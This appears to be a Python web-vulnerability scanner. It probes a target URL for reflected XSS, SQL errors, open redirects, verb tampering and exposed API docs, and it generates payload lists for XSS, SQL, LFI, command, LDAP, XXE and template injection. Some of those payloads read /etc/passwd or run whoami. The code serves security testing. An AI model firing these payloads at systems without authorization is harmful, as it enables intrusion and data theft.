import requests
from bs4 import BeautifulSoup
import html
from typing import List, Dict, Union, Any
import re

def scan_reflected_xss(url: str, param: str, payload: str = "<script>alert(1)</script>") -> Dict[str, Any]:
    """Checks if a payload is reflected in the response body."""
    try:
        # Construct URL with payload
        if '?' in url:
            target = f"{url}&{param}={payload}"
        else:
            target = f"{url}?{param}={payload}"

        response = requests.get(target, timeout=5)
        if payload in response.text:
            return {"status": "vulnerable", "message": f"Potential Reflected XSS found on parameter '{param}'"}
        return {"status": "safe", "message": "Payload not reflected verbatim"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def scan_sql_error(url: str, param: str) -> Dict[str, Any]:
    """Checks for common SQL error messages."""
    payload = "'"
    errors = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL query failed"
    ]
    try:
        if '?' in url:
            target = f"{url}&{param}={payload}"
        else:
            target = f"{url}?{param}={payload}"

        response = requests.get(target, timeout=5)
        for err in errors:
            if err in response.text:
                return {"status": "vulnerable", "message": f"Potential SQL Injection Error detected: {err}"}
        return {"status": "safe", "message": "No common SQL errors detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def scan_open_redirect(url: str, param: str, target: str = "http://example.com") -> Dict[str, Any]:
    try:
        if '?' in url:
            test_url = f"{url}&{param}={target}"
        else:
            test_url = f"{url}?{param}={target}"

        response = requests.get(test_url, allow_redirects=False, timeout=5)
        if response.status_code in [301, 302, 307, 308]:
            loc = response.headers.get('Location', '')
            if target in loc:
                return {"status": "vulnerable", "message": f"Potential Open Redirect on parameter '{param}'"}
        return {"status": "safe", "message": "No redirect detected"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def generate_xss_payloads() -> List[str]:
    return [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>"
    ]

def generate_sqli_payloads() -> List[str]:
    return [
        "' OR 1=1 --",
        "' OR '1'='1",
        "admin' --",
        "' UNION SELECT 1,2,3 --",
        "sleep(5) --"
    ]

def generate_lfi_payloads() -> List[str]:
    return [
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "../../../../windows/win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
    ]

def identify_input_params(url: str) -> Dict[str, Any]:
    """Extracts input names from forms."""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        inputs = soup.find_all('input')
        params = [i.get('name') for i in inputs if i.get('name')]
        return {"status": "success", "params": list(set(params))}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_http_verb_tampering(url: str) -> Dict[str, Any]:
    """Checks if other verbs are accepted."""
    verbs = ['HEAD', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
    results = {}
    try:
        for verb in verbs:
            res = requests.request(verb, url, timeout=5)
            results[verb] = res.status_code
        return {"status": "success", "results": results}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def basic_html_encoding(text: str) -> str:
    return html.escape(text)

def basic_html_decoding(text: str) -> str:
    return html.unescape(text)

def check_xml_rpc(url: str) -> Dict[str, Any]:
    try:
        if not url.endswith('/'): url += '/'
        res = requests.post(url + "xmlrpc.php", data="test", timeout=5)
        if res.status_code == 200 and "XML-RPC server accepts POST requests only" in res.text:
            return {"status": "detected", "message": "XML-RPC enabled"}
        return {"status": "not_detected", "message": "XML-RPC likely disabled or not found"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

def check_local_file_inclusion_heuristic(url: str, param: str) -> str:
    # Very basic check if page size changes drastically or reflects content
    # Safe check is hard.
    return "Heuristic LFI check requires manual analysis usually."

def detect_base64(text: str) -> bool:
    import base64
    try:
        if len(text) % 4 == 0 and re.match('^[A-Za-z0-9+/]+={0,2}$', text):
            base64.b64decode(text, validate=True)
            return True
        return False
    except:
        return False

def check_stack_trace_exposure(text: str) -> Dict[str, Any]:
    indicators = [
        "Traceback (most recent call last)",
        "System.Exception",
        "at java.lang.Thread.run",
        "Warning: include(",
        "Fatal error:"
    ]
    found = [ind for ind in indicators if ind in text]
    if found:
        return {"status": "vulnerable", "traces_found": found}
    return {"status": "safe", "message": "No stack trace indicators found"}

def generate_cmd_injection_payloads() -> List[str]:
    return [
        "; cat /etc/passwd",
        "| whoami",
        "`whoami`",
        "jules",
        "&& dir"
    ]

def generate_ldap_payloads() -> List[str]:
    return [
        "*",
        "*)(uid=*))(|(uid=*",
        "*()|&'",
        "admin*)((|userpassword=*)",
        ")(|(uid=*)"
    ]

def generate_xml_payloads() -> List[str]:
    return [
        "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
        "<foo><![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]></foo>"
    ]

def generate_ssti_payloads() -> List[str]:
    return [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "{{''.__class__.__mro__[1].__subclasses__()}}"
    ]

def check_json_response(url: str) -> str:
    try:
        res = requests.get(url, timeout=5)
        res.json()
        return "Returns Valid JSON"
    except:
        return "Not JSON"

def check_api_docs(url: str) -> Dict[str, Any]:
    paths = ['/swagger.json', '/api/docs', '/docs', '/redoc', '/openapi.json']
    found = []
    if not url.endswith('/'): url += '/'
    for p in paths:
        try:
            res = requests.head(url.rstrip('/') + p, timeout=3)
            if res.status_code == 200:
                found.append(p)
        except:
            pass
    if found:
        return {"status": "found", "docs": found}
    return {"status": "not_found", "message": "No API docs found"}
